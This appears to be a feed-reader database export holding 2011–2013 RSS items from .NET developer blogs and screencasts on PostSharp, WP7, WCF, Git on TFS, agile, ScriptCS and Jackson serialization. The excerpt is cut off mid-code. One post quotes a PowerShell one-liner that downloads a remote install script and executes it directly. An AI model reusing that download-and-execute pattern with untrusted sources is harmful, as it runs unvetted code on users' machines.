{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/196","title":"Episode #196: Postsharp - Getting Started with AOP using Postsharp","published":{"$wrap":"$date","v":1311490800000,"h":"2011-07-24T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Matthew Groves<br><br>This episode we are we are going to take a look at how to implemented AOP (Aspect Orientated Programming) with PostSharp.<br><br>We will be using the Postsharp library in this episode and we will take a look at how to create our first Aspect as well as how to use the metadata with the aspect to provide real business value in your application.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/196'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/196'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/196&title=Postsharp - Getting Started with AOP using Postsharp&description=Postsharp - Getting Started with AOP using Postsharp'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/196'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/196';</script><script type='text/javascript'>var dzone_title = 'Postsharp - Getting Started with AOP using Postsharp';</script><script type='text/javascript'>var dzone_blurb = 'Postsharp - Getting Started with AOP using Postsharp';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/196';digg_title = 'Postsharp - Getting Started with AOP using Postsharp';digg_bodytext = 'Postsharp - Getting Started with AOP using Postsharp';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Matthew Groves","_id":{"$wrap":"$oid","v":947}}
{"k":"0000000082","o":"0000002211","v":"001"}
{"_id":948,"_uid":948,"_dt":1373729981390,"_s":"ef53854ca765a59114d2c041b5ac704a"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/195","title":"Episode #195: WP7 - Learning how to use Live Tiles","published":{"$wrap":"$date","v":1310972400000,"h":"2011-07-18T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a look at how we can use Live Tiles in WP7 (Mango).<br><br>WP7 Mango has introduced not only the ability to create Application Tiles via code but they have also added the ability to create Secondary Tiles, tiles which can deep link into your application.  These Secondary tiles can also be created, updated and deleted in code and can provide a very powerful feature for your application.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/195'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/195'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/195&title=WP7 - Learning how to use Live Tiles&description=WP7 - Learning how to use Live Tiles'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/195'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/195';</script><script type='text/javascript'>var dzone_title = 'WP7 - Learning how to use Live Tiles';</script><script type='text/javascript'>var dzone_blurb = 'WP7 - Learning how to use Live Tiles';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/195';digg_title = 'WP7 - Learning how to use Live Tiles';digg_bodytext = 'WP7 - Learning how to use Live Tiles';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":948}}
{"k":"0000000082","o":"0000002219","v":"001"}
{"_id":949,"_uid":949,"_dt":1373729981390,"_s":"1a340f7a44bff5a5baecce1e92e6e3cb"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/193","title":"Episode #193: WCF: How to create Custom Message Interceptors","published":{"$wrap":"$date","v":1305529200000,"h":"2011-05-16T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>In this episode we are going to take a look at how to extend WCF to create custom Message Interceptors<br><br>We will first take a look at how we can create our custom interceptors and hook them into the WCF pipeline.  We will then take a look at how we can intercept both inbound and outbound messages to allow us to perform some sort of actions agains the messages.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/193'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/193'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/193&title=WCF: How to create Custom Message Interceptors&description=WCF: How to create Custom Message Interceptors'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/193'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/193';</script><script type='text/javascript'>var dzone_title = 'WCF: How to create Custom Message Interceptors';</script><script type='text/javascript'>var dzone_blurb = 'WCF: How to create Custom Message Interceptors';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/193';digg_title = 'WCF: How to create Custom Message Interceptors';digg_bodytext = 'WCF: How to create Custom Message Interceptors';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":949}}
{"k":"0000000082","o":"0000002182","v":"001"}
{"_id":950,"_uid":950,"_dt":1373729981391,"_s":"e100b4021c25ffcc7c4eb675555ae26f"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/198","title":"Episode #198: WP7 - Creating and Using Associations w/ SQL CE","published":{"$wrap":"$date","v":1312700400000,"h":"2011-08-07T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take another look at SQL CE on WP7 Mango.<br><br>However, in this episode we will go a step further and learn how to setup relationships (aka associations) between our tables (aka models).  We will focus on how to use the [Association] attribute to link our parent-child models together.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/198'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/198'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/198&title=WP7 - Creating and Using Associations w/ SQL CE&description=WP7 - Creating and Using Associations w/ SQL CE'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/198'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/198';</script><script type='text/javascript'>var dzone_title = 'WP7 - Creating and Using Associations w/ SQL CE';</script><script type='text/javascript'>var dzone_blurb = 'WP7 - Creating and Using Associations w/ SQL CE';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/198';digg_title = 'WP7 - Creating and Using Associations w/ SQL CE';digg_bodytext = 'WP7 - Creating and Using Associations w/ SQL CE';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":950}}
{"k":"0000000082","o":"0000000862","v":"001"}
{"_id":951,"_uid":951,"_dt":1373730296033,"_s":"d7ee4f76a8fecf3dbd2fc37359a70795"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/07/10/is-this-a-reference/?utm_source=rss&utm_medium=rss&utm_campaign=is-this-a-reference","title":"Is This a Reference?","published":{"$wrap":"$date","v":1373483266000,"h":"2013-07-10T19:07:46.000Z"},"starred":false,"read":false,"content":"<p>Turns out, Visual Studio sees the first red box as a legit code reference as shown in red box # 2.</p><p>Is that what you would expect, Internet?</p><p><a href=\"http://elegantcode.com/wp-content/uploads/2013/07/image1.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/07/image_thumb.png\" width=\"523\" height=\"400\" /></a></p>","author":"David Starr","_id":{"$wrap":"$oid","v":951}}
{"k":"0000000082","o":"0000001931","v":"001"}
{"_id":952,"_uid":952,"_dt":1373730296035,"_s":"86282200e38ed8d70cb0755cefbef071"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/06/20/authentication-error-connecting-to-git-on-tfs/?utm_source=rss&utm_medium=rss&utm_campaign=authentication-error-connecting-to-git-on-tfs","title":"Authentication error connecting to Git on TFS","published":{"$wrap":"$date","v":1371750423000,"h":"2013-06-20T17:47:03.000Z"},"starred":false,"read":false,"content":"<p>I’m throwing this out there since I couldn’t find much on this specific problem. #payingItForward</p><h4>Problem</h4><p>I struggled getting the git command line to authenticate with Git Team Foundation Service online.</p><p>My current environment is Windows 8, msysgit, with the git-credential-winstore tool installed. (Love that credential tool)</p><p>When I first tried to (push, fetch, or pull) from a newly created TFS Git repository I received git-credential-winstore authentication dialog, entered my credentials and received the following error,</p><blockquote><p>Failed to erase credential: Element not found      <br />fatal: Authentication failed</p></blockquote><p>After googling that error I found this link <a href=\"http://blog.jennysjottings.co.uk/2013/01/20/github-glitch/\">http://blog.jennysjottings.co.uk/2013/01/20/github-glitch/</a> who’s approach did not work in my case.</p><h4>Solution: Short Version</h4><ol><li>Log into your TFS account (online) </li><li>go to your account settings then credentials </li><li>setup the alternate login </li></ol><h4>Solution: Long version</h4><ol><li>First go to the following link:  <a href=\"http://tfs.visualstudio.com/en-us/learn/use-git-and-xcode-with-tfs.aspx\" target=\"_blank\">Use Git  and XCode with TFS</a> </li><li>scroll down to the section titled:<br /><h4>Enable basic authentication for your account</h4></li><li>Follow those directions </li></ol><h5>Hope this helps.</h5><p>Happy Git-ing!</p>","author":"Jason Jarrett","_id":{"$wrap":"$oid","v":952}}
{"k":"0000000082","o":"0000002174","v":"001"}
{"_id":953,"_uid":953,"_dt":1373730296036,"_s":"9ecb9efbab4701823763d06be50b8621"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/06/17/3-pillars-of-pragmatic-agility/?utm_source=rss&utm_medium=rss&utm_campaign=3-pillars-of-pragmatic-agility","title":"So Long and Thanks for all the Manifestos : Redux","published":{"$wrap":"$date","v":1371496497000,"h":"2013-06-17T19:14:57.000Z"},"starred":false,"read":false,"content":"<p>I recently wrote <a href=\"http://visualstudiomagazine.com/articles/2013/06/01/so-long-and-thanks-for-the-all-the-manifestos.aspx\">this article for Visual Studio Magazine’s Agile/Scrum column</a> and it just went to press. In this article, <em>So Long and Thanks for all the Manifestos</em><span style=\"text-decoration: underline;\">,</span> I make a case for a new standard for agile software delivery. Simply put, we are now standing on the shoulders of giants like the Agile Manifesto signatories and 12 years of shared learning in the various agile communities. And things are bit clearer today than they were a decade years ago.</p><p>The original value statements and supporting values of the <em><a href=\"http://agilemanifesto.org\">Manifesto for Agile Software Development</a></em> are valid, valuable, and rare. There are plenty of teams out there delivering software without any formal acknowledgement or even awareness of the Agile Manifesto. Far be it from me to assert these teams aren’t agile just because the don’t follow a particular dogma or implement a specific technique.</p><p>In the last few years those teams I consider truly agile demonstrate similar patterns of behavior. To be honest, the values expressed in the Agile Manifesto may or not be present in these teams. Rather than thinking deeply about the value statements, many teams focus on behaviors I’ll call the <em>3 Pillars of Pragmatic Agility</em>.</p><h2>3 Pillars of Pragmatic Agility</h2><ol><li>Ship often.</li><li>Keep quality high.</li><li>Use feedback to improve.</li></ol><p>There is obviously a lot to discern and discuss about these three very high-level behaviors. I will leave the details for future writing, pontificating, and arguing.</p>","author":"David Starr","_id":{"$wrap":"$oid","v":953}}
{"k":"0000000082","o":"0000001487","v":"001"}
{"_id":954,"_uid":954,"_dt":1373730296037,"_s":"74ba0262aad70dbb244c280d23cdcb95"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/06/04/going-top-gun-on-your-code/?utm_source=rss&utm_medium=rss&utm_campaign=going-top-gun-on-your-code","title":"Going Top Gun on Your Code","published":{"$wrap":"$date","v":1370361904000,"h":"2013-06-04T16:05:04.000Z"},"starred":false,"read":false,"content":"<p>I am delighted to announce that I can finally talk about the feature our team has been building for the next version of Visual Studio. Yesterday at TechEd North America, we announced the new Head Up Display capability in Visual Studio. This feature provides developers with an augmented view of code in which we try and surface meaningful information about your code, on your code. </p><p>There are so many people involved in this work there is no way to recognize them all. This is a major investment for our product group and we look forward to refining the experience as we move toward a release date.</p><p>I will start blogging more on this topic now that the covers have come off the feature. In the meantime, here is the video of Peter Provost’s talk at TechEd yesterday, introducing the feature. The show and tell for the Head Up Display features begin at about 22 minutes into the talk.</p><p><iframe style=\"height: 600px; width: 600px\" src=\"http://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/DEV-B321/player?w=600&h=540\" frameborder=\"0\" scrolling=\"no\"></iframe></p>","author":"David Starr","_id":{"$wrap":"$oid","v":954}}
{"k":"0000000082","o":"0000004840","v":"001"}
{"_id":955,"_uid":955,"_dt":1373730296038,"_s":"88230cb4ab5c9eb4459cf3533525fe3a"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/05/31/taking-baby-steps-with-scriptcs/?utm_source=rss&utm_medium=rss&utm_campaign=taking-baby-steps-with-scriptcs","title":"Taking Baby Steps with ScriptCS","published":{"$wrap":"$date","v":1370032209000,"h":"2013-05-31T20:30:09.000Z"},"starred":false,"read":false,"content":"<p align=\"justify\">I’ve been following the <a href=\"http://scriptcs.net/\" target=\"_blank\">ScriptCS</a> project with great interest over the last couple of months. As you may know by now, I’ve been searching for <a href=\"http://elegantcode.com/2012/11/30/visual-studio-light-edition/\" target=\"_blank\">a more lightweight .NET development experience</a> for quite some time. The ScriptCS project is here to fulfill this desperate need. Driven by <a href=\"https://github.com/scriptcs/scriptcs/wiki/Contributors\" target=\"_blank\">the open-source .NET community</a>, this wonderful initiative promises to unleash C# from Visual Studio which is exactly what I’ve been looking for.</p></p><p align=\"justify\">Being heavily inspired by the <a href=\"http://nodejs.org/\" target=\"_blank\">node.js</a> development workflow, ScriptCS is built on top of <a href=\"http://msdn.microsoft.com/en-us/vstudio/roslyn.aspx\" target=\"_blank\">Roslyn</a> and makes heavy use of NuGet for installing packages and <a href=\"https://github.com/scriptcs/scriptcs/wiki/Script-Packs-master-list\" target=\"_blank\">script packs</a>. You can get up and running in no time by installing ScriptCS using <a href=\"http://chocolatey.org/\" target=\"_blank\">Chocolatey</a>. If you didn’t have Chocolatey installed already (like me), then it can be easily done by running the following Powershell command:</p><blockquote><p align=\"justify\"><em>@powershell -NoProfile -ExecutionPolicy Unrestricted -Command \"iex ((New-Object Net.WebClient).DownloadString(‘</em><a href=\"https://chocolatey.org/install.ps1'))\"\"><em>https://chocolatey.org/install.ps1′))\"</em></a><em> && SET PATH=%PATH%;%systemdrive%\\chocolatey\\bin</em> </p></blockquote><p align=\"justify\">Now we can install ScriptCS by simply running the following command:</p><blockquote><p align=\"justify\"><em>cinst scriptcs</em></p></blockquote><p align=\"justify\">That’s all we need! </p><p align=\"justify\">Now in order to do something useful with it, we can clone the samples repository to our dev machine and try to run the <a href=\"http://nancyfx.org/\" target=\"_blank\">Nancy</a> sample application. Navigate to the <em>Nancy</em> folder in a command prompt and run the command <em>“scriptcs -install”</em> to install all package dependencies defined in the <em>packages.config</em> file. Next run the following command to start the web application:</p><p align=\"justify\"><a href=\"http://elegantcode.com/wp-content/uploads/2013/05/image1.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image_thumb.png\" width=\"409\" height=\"77\" /></a> </p><p align=\"justify\">Now open up your favorite browser, navigate to <a href=\"http://localhost:1234\">http://localhost:1234</a> and <em>et voilà</em>:</p><p align=\"justify\"><a href=\"http://elegantcode.com/wp-content/uploads/2013/05/image2.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image_thumb1.png\" width=\"409\" height=\"368\" /></a> </p><p align=\"justify\">Amazing isn’t it? </p><p align=\"justify\">I do recognize that the project is still very much a work in progress. Also something that’s not entirely clear for me is the deployment story. The road map mentions some kind of export functionality to an .exe or a Visual Studio Project. In any case, there should be an easy way to convert the code files into binary form. </p><p align=\"justify\">Something that I also would love to see is support for <a href=\"http://www.mono-project.com/Main_Page\" target=\"_blank\">Mono</a>. How cool would it be to develop and run C# code using ScriptCS on Mac and Linux?</p><p align=\"justify\">The future for ScriptCS certainly looks bright and I’m very much looking forward to where <a href=\"https://github.com/scriptcs/scriptcs/wiki/Goals-and-Roadmap\">this particular road</a> is taking the .NET universe. Take a look at the <a href=\"https://github.com/scriptcs/scriptcs/wiki\">wiki </a> and start familiarize yourself with ScriptCS as it’s going to open up very interesting opportunities for future .NET development.</p><p align=\"justify\">Until next time.</p>","author":"Jan Van Ryswyck","_id":{"$wrap":"$oid","v":955}}
{"k":"0000000082","o":"0000028592","v":"001"}
{"_id":956,"_uid":956,"_dt":1373730296039,"_s":"3cac50a31ce5ee79e2714d24d379adf3"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/06/03/jackson-data-binding-message-serialization/?utm_source=rss&utm_medium=rss&utm_campaign=jackson-data-binding-message-serialization","title":"Jackson Data Binding Message Serialization","published":{"$wrap":"$date","v":1370283678000,"h":"2013-06-03T18:21:18.000Z"},"starred":false,"read":false,"content":"<p>So now that I have a custom game server connected to a message-based infrastructure, I need a way to send messages back and forth to other parts of the system.  Messages going to and from the custom game server are transmitted as JSON given that the format is easy to work with, supported in all the languages we’re immediately concerned with, and more or less straightforward.</p><p>For my Java-based server I am using <a href=\"http://http://wiki.fasterxml.com/JacksonHome\" target=\"_blank\">Jackson</a> and <a href=\"https://github.com/FasterXML/jackson-databind\" target=\"_blank\">Jackson-databind</a> to magically turn JSON into POJOs and back.</p><h4>Message Formatting</h4><p>Let’s consider a more interesting version of our Message: Along with other basic message information (here represented by the not-very-interesting property “text”) a Message contains a Body, of which there are many possible implementations for Body.</p><div style=\"border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px\" id=\"codeSnippetWrapper\"><div style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #0000ff\">public</span> <span style=\"color: #0000ff\">class</span> Message {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> String text;</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include=JsonTypeInfo.As.PROPERTY, property=<span style=\"color: #006080\">\"bodyType\"</span>)</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    @JsonSubTypes(<span style=\"color: #0000ff\">value</span> = {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">            @JsonSubTypes.Type(<span style=\"color: #0000ff\">value</span> = BeginBattleRequest.<span style=\"color: #0000ff\">class</span>),</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">            @JsonSubTypes.Type(<span style=\"color: #0000ff\">value</span> = BeginBattleResponse.<span style=\"color: #0000ff\">class</span>),</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">            @JsonSubTypes.Type(<span style=\"color: #0000ff\">value</span> = GetNameRequest.<span style=\"color: #0000ff\">class</span>),</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">            @JsonSubTypes.Type(<span style=\"color: #0000ff\">value</span> = GetNameResponse.<span style=\"color: #0000ff\">class</span>)</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    })</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> Object body;</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> Message() {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    }</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> Message(String text) {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        <span style=\"color: #0000ff\">this</span>.text = text;</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    }</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">}</pre><p><!--CRLF--></div></div><p>Jackson Databinding uses the type information of the body to figure out what value to put in a property we’ve decided to call “bodyType”.  Given this information, Jackson can figure out how to reconstruct the objects when given the JSON string this serializes to:</p><div style=\"border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px\" id=\"codeSnippetWrapper\"><div style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">{ </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #006080\">\"text\"</span>:<span style=\"color: #006080\">\"fight!\"</span>,</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 